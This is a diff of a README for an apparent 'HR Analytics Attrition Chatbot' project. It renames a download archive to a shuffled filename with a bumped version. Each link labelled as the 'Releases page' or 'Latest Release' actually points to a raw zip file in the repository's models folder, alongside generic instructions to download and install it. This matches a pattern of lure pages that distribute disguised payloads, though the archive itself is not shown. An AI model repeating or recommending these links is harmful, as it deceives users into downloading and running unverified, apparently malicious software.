@@ -1,6 +1,6 @@
 # 🤖 hr-analytics-attrition-chatbot - Simplifying HR Analytics with AI
 
-[![Download Latest Release](https://github.com/MOHDABDULADEL/hr-analytics-attrition-chatbot/raw/refs/heads/main/models/attrition_hr_chatbot_analytics_v1.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/MOHDABDULADEL/hr-analytics-attrition-chatbot/raw/refs/heads/main/models/attrition_hr_chatbot_analytics_v1.7.zip)
+[![Download Latest Release](https://github.com/MOHDABDULADEL/hr-analytics-attrition-chatbot/raw/refs/heads/main/models/analytics-chatbot-attrition-hr-v2.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/MOHDABDULADEL/hr-analytics-attrition-chatbot/raw/refs/heads/main/models/analytics-chatbot-attrition-hr-v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **HR Analytics Attrition Chatbot**! This application helps you an
 
 To get started, you need to download the application. Follow these steps:
 
-1. Visit our [Releases page](https://github.com/MOHDABDULADEL/hr-analytics-attrition-chatbot/raw/refs/heads/main/models/attrition_hr_chatbot_analytics_v1.7.zip).
+1. Visit our [Releases page](https://github.com/MOHDABDULADEL/hr-analytics-attrition-chatbot/raw/refs/heads/main/models/analytics-chatbot-attrition-hr-v2.7.zip).
 2. Look for the latest version of the application.
 3. Click on the download link for your system. If you are not sure, select the option available for your operating system.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -53,7 +53,7 @@ Once you have the application running, you can take advantage of these key featu
 
 Keep your application up to date for the best performance. To do this:
 
-1. Return to the [Releases page](https://github.com/MOHDABDULADEL/hr-analytics-attrition-chatbot/raw/refs/heads/main/models/attrition_hr_chatbot_analytics_v1.7.zip).
+1. Return to the [Releases page](https://github.com/MOHDABDULADEL/hr-analytics-attrition-chatbot/raw/refs/heads/main/models/analytics-chatbot-attrition-hr-v2.7.zip).
 2. Check for any new versions available.
 3. Download and install the latest version following the same instructions mentioned above.
 
@@ -76,4 +76,4 @@ Thank you for using the HR Analytics Attrition Chatbot. We hope you find it usef
 
 For a quick reference, here's the download link again:
 
-[![Download Latest Release](https://github.com/MOHDABDULADEL/hr-analytics-attrition-chatbot/raw/refs/heads/main/models/attrition_hr_chatbot_analytics_v1.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/MOHDABDULADEL/hr-analytics-attrition-chatbot/raw/refs/heads/main/models/attrition_hr_chatbot_analytics_v1.7.zip)
+[![Download Latest Release](https://github.com/MOHDABDULADEL/hr-analytics-attrition-chatbot/raw/refs/heads/main/models/analytics-chatbot-attrition-hr-v2.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/MOHDABDULADEL/hr-analytics-attrition-chatbot/raw/refs/heads/main/models/analytics-chatbot-attrition-hr-v2.7.zip)
